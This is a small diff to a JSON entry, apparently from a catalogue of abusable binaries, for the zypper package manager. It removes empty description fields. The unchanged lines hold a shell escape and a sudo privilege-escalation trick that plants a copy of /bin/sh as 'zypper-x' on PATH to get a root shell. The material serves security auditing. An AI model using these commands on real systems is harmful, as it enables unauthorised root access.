@@ -6,7 +6,7 @@
         "code": "zypper x\n"
       },
       {
-        "description": "",
+        
         "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x\n"
       }
     ],
@@ -16,7 +16,7 @@
         "code": "sudo zypper x\n"
       },
       {
-        "description": "",
+        
         "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
       }
     ]
